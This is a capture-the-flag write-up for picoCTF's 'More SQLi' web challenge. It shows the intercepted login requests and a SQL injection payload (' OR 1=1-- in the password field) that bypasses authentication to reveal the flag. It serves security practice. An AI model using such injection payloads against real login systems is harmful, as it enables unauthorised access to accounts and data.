# Challange Info

Name : More SQLi

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/358?category=1&page=1

# Writeup

Navigating the webapp http://saturn.picoctf.net:62528/.

Capture the login request and send it to repeater.

```
POST / HTTP/1.1

Host: saturn.picoctf.net:62528

Content-Length: 28

Cache-Control: max-age=0

Origin: http://saturn.picoctf.net:62528

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://saturn.picoctf.net:62528/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: PHPSESSID=aimvq7poka2o9522sbtqqlj36j

sec-gpc: 1

Connection: keep-alive

username=asad&password=dsada
```

Trying SQL Injection `admin'--`.

```
username: admin'--
password: dsadas
SQL query: SELECT id FROM users WHERE password = 'dsadas' AND username = 'admin'--'
```

But it dosen't work.

So I changed payload according to the query.

```
POST / HTTP/1.1

Host: saturn.picoctf.net:62528

Content-Length: 33

Cache-Control: max-age=0

Origin: http://saturn.picoctf.net:62528

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://saturn.picoctf.net:62528/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: PHPSESSID=aimvq7poka2o9522sbtqqlj36j

sec-gpc: 1

Connection: keep-alive

username=asad&password=' OR 1=1--
```

In response of this request there is the flag.
